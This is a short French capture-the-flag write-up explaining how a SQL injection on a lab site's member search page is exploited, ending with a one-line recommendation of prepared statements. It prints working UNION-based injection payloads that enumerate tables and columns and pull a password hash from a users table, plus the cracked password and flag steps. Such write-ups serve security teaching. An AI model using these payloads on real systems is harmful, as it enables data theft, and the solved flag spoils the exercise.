# exploiter faille SQL

## Exploit
sur la page /page=member nous pouvons effectuer une recherche direcement dans la base de donnee \
pour exploiter la table nous avons besoin de connaitre le nom des tables et des colonne. \
dans un premier temp on cherche le nombre de colonne avec : 1 ORDER BY X \
une fois X determine on recherche le nom de la table qui nous interesse avec : 1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables \
(ajouter autant de table_schema ou table_name que X) \
ensuite il nous faut determiner les colonnes de la table : 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns \
pour finir on execute notre requete avec les informations recuperees : 1 AND 1=2 UNION SELECT Commentaire, countersign FROM users \
la base de donnees nous affiche : First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good ! \
le mot de passe est : 5ff9d0165b4f92b14994e5c685cdce28 \
decrypte : FortyTwo \
on met en minuscule puis encrypte en Sh256 pour avoir le flag. \
\
## Protection :
L'utilisation de requete preparee en back  permet d'eviter l'injection sql. \
